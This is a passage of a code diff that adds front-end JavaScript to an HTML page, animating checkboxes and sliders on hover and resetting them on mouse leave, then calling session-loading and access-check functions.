+  {cb:document.getElementById('c7'),lbl:document.getElementById('l7'),hov:false,isBlue:false},
+  {cb:document.getElementById('c8'),lbl:document.getElementById('l8'),hov:true,isBlue:false},
+  {cb:document.getElementById('c9'),lbl:document.getElementById('l9'),hov:false,isBlue:false},
+  {cb:document.getElementById('c10'),lbl:document.getElementById('l10'),hov:false,isBlue:false}
+];
+
+var raf = null;
+var hovering = false;
+
+document.getElementById('uiW').addEventListener('mouseenter', function(){
+  hovering = true;
+  animSliders();
+  cbs.forEach(function(c, i){
+    setTimeout(function(){
+      if(!hovering) return;
+      if(c.hov){
+        c.cb.classList.add('on');
+        if(!c.isBlue) c.lbl.style.color = 'var(--text-mid)';
+      }
+    }, i * 55);
+  });
+});
+
+document.getElementById('uiW').addEventListener('mouseleave', function(){
+  hovering = false;
+  cancelAnimationFrame(raf);
+  sliders.forEach(function(s){ s.el.style.width = s.base + '%' });
+  cbs.forEach(function(c){
+    if(c.isBlue) return;
+    c.cb.classList.remove('on');
+    c.lbl.style.color = '';
+  });
+});
+
+function animSliders(){
+  if(!hovering) return;
+  var t = Date.now() / 900;
+  sliders.forEach(function(s){
+    var target = s.base + Math.sin(t + s.phase) * s.amp;
+    var cur = parseFloat(s.el.style.width) || s.base;
+    s.el.style.width = (cur + (target - cur) * 0.06) + '%';
+  });
+  raf = requestAnimationFrame(animSliders);
+}
+
+loadSession();
+checkWebBaseAccess();
 </script>
 </body>
 </html>
